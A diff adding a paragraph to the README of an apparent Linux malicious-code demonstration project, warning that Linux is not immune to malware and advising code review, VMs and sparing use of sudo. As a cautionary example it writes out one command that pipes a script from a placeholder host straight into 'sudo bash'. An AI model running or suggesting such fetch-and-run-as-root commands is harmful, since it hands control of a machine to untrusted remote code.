@@ -19,6 +19,15 @@ My reply was:
 ````
 Turned out I was wrong, you need ed, find, grep and head.
 
+A more serious reason is to show that Linux is not, in any way, immune to viruses or malicious code. While package repositories that comes with your distribution most likely is safe, and the system at school/work where an administrator takes care of your system and you won't be able to do much more harm than to remove your own files, many people have Linux on their laptop/desktop or a Raspberry PI they play around with with root access.
+
+Again, repositories are usualluy safe but be careful with source-code and scripts you download and NEVER EVER do stupid things like: 
+
+````
+wget -O - http://totaly.trustworthy.domain/install_script_not_malicious_winkwink.sh | sudo bash
+````
+
+My advice is to check the code you download if possible. Never mix important data like bitcoin-wallets, personal photos and other important files on the same machine you develop on. Use containers or virtual machines when you want to try something new. And avoid sudo. Yes, I know, everyone says that you should never log in as root and use sudo for tasks that require administrator access. But people are lazy and it leads to dangerous behaviour as in the example above. I prefer opening up a separate root-shell and then not use it, unless I absolutely have to. Instead of using a semi-privileged account that can access everything anyway.
 
 ## How do I run it on my Linux server ##
 Don't. Run it someone elses server.
